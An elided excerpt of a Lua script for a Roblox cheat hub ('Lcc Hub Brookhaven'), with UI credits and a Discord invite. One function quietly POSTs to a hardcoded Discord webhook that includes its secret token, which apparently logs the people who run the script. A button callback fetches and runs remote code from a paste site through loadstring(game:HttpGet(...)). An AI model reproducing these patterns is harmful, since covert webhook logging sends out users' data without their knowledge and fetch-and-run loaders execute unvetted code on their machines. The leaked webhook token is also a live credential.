...
local function ExecuteLog()
    ...
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1452779801357320273/Z4SVxXmmirFAFzdUxFRFeNgiTiR3BwtFMoE4GgEh9Fk8x9YR2QKf258fnh4ON20J2VUp",
            Method = "POST",
...
InfoTab:AddParagraph({ "Owner / Developer:", "Lcc" })
InfoTab:AddParagraph({ "Collaborations:", "Lcc,lucas:3" })
InfoTab:AddParagraph({ "You are using:", "Lcc Hub Brookhaven " })
...
InfoTab:AddDiscordInvite({
    Name = "Lcc Hub",
    Description = "https://discord.gg/rqXwmbZvqt",
    Logo = "rbxassetid://124557134667231",
    Invite = "https://discord.gg/rqXwmbZvqt",
})
...
Tab16:AddButton({
    ...
    Callback = function()
        loadstring(game:HttpGet("https://ghostbin.axel.org/paste/2ntfg/raw"))()
